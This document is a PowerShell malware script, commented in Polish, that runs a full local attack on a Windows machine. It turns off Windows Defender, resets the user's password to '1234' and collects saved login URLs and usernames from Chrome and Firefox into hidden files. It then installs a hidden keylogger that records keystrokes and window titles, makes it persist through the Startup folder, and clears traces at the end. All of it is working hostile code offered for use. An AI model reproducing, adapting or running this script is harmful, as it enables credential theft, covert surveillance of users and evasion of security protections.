# ================ WYŁĄCZENIE WINDOWS DEFENDERA ================
try {
    # Zmiana ustawień rejestru
    $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    Set-ItemProperty -Path $regPath -Name "DisableAntiSpyware" -Value 1 -Type DWORD -Force
    Set-ItemProperty -Path $regPath -Name "DisableRoutinelyTakingAction" -Value 1 -Type DWORD -Force
    
    # Zatrzymanie usługi
    Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
    Set-Service -Name WinDefend -StartupType Disabled -ErrorAction SilentlyContinue
} catch { }

# ================ TWORZENIE PLIKU SYSTEMOWEGO ================
$systemFile = "E:\SystemCache.dat"
$randomContent = -join (48..57 + 65..90 + 97..122 | Get-Random -Count 128 | ForEach-Object { [char]$_ })
[System.IO.File]::WriteAllText($systemFile, $randomContent, [System.Text.Encoding]::UTF8)
attrib +s +h +r $systemFile

# ================ ZMIANA HASŁA UŻYTKOWNIKA ================
$username = $env:USERNAME
$command = "net user $username 1234 /Y"
Invoke-Expression $command

# ================ ZBIERANIE DANYCH Z PRZEGLĄDAREK ================
$browserData = @{}
$browserFile = "E:\BrowserData.dat"

# Chrome
try {
    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    if (Test-Path $chromePath) {
        $tempCopy = "$env:TEMP\chrome_data"
        Copy-Item $chromePath $tempCopy -Force
        
        $connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection
        $connection.ConnectionString = "Data Source=$tempCopy;"
        $connection.Open()
        
        $command = $connection.CreateCommand()
        $command.CommandText = "SELECT origin_url, username_value FROM logins"
        $adapter = New-Object -TypeName System.Data.SQLite.SQLiteDataAdapter $command
        $dataset = New-Object -TypeName System.Data.DataSet
        $adapter.Fill($dataset) | Out-Null
        
        $chromeData = @()
        foreach ($row in $dataset.Tables[0].Rows) {
            $chromeData += @{
                URL = $row.origin_url
                Username = $row.username_value
            }
        }
        $browserData.Chrome = $chromeData
        $connection.Close()
        Remove-Item $tempCopy -Force
    }
} catch { }

# Firefox
try {
    $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $firefoxPath) {
        $profile = Get-ChildItem $firefoxPath -Directory | Where-Object { $_.Name -match "default-release" } | Select-Object -First 1
        $loginsJson = Join-Path $profile.FullName "logins.json"
        if (Test-Path $loginsJson) {
            $firefoxData = Get-Content $loginsJson | ConvertFrom-Json
            $browserData.Firefox = $firefoxData.logins
        }
    }
} catch { }

$browserData | ConvertTo-Json -Depth 5 | Out-File $browserFile -Encoding UTF8
attrib +s +h +r $browserFile

# ================ KEYLOGGER ================
$keyloggerFile = "E:\Keylogger.ps1"
$keylogOutput = "E:\Keylog.dat"

$keyloggerScript = @'
$signature = @"
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
"@
Add-Type -MemberDefinition $signature -Name Keyboard -Namespace KeyLogger

$logPath = "E:\Keylog.dat"
$lastWindow = ""

while($true) {
    Start-Sleep -Milliseconds 40
    
    # Śledzenie aktywnego okna
    $currentWindow = (Get-Process | Where-Object { $_.MainWindowTitle -ne "" } | 
                    Sort-Object StartTime -Descending | Select-Object -First 1).MainWindowTitle
    
    if ($currentWindow -ne $lastWindow) {
        $lastWindow = $currentWindow
        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        "`n[$timestamp] Active: $currentWindow`n" | Out-File $logPath -Append -Encoding UTF8
    }
    
    # Rejestracja klawiszy
    for ($asc = 8; $asc -le 254; $asc++) {
        $state = [KeyLogger.Keyboard]::GetAsyncKeyState($asc)
        if ($state -eq -32767) {
            $key = switch ($asc) {
                8 { "[BACKSPACE]" }
                9 { "[TAB]" }
                13 { "`n" }
                27 { "[ESC]" }
                32 { " " }
                default { [char]$asc }
            }
            $key | Out-File $logPath -Append -Encoding UTF8
        }
    }
}
'@

$keyloggerScript | Out-File $keyloggerFile -Encoding UTF8
attrib +s +h +r $keyloggerFile
attrib +s +h +r $keylogOutput

# Uruchom keyloggera w ukryciu
Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$keyloggerFile`""

# ================ PERSYSTENCJA ================
$persistenceFile = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SystemInit.vbs"
$persistenceScript = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File ""E:\Keylogger.ps1""", 0, False
"@

$persistenceScript | Out-File $persistenceFile -Encoding ASCII

# ================ CZYSZCZENIE ŚLADÓW ================
Remove-Item "$env:TEMP\v.vbs" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\p.ps1" -Force -ErrorAction SilentlyContinue
Clear-History
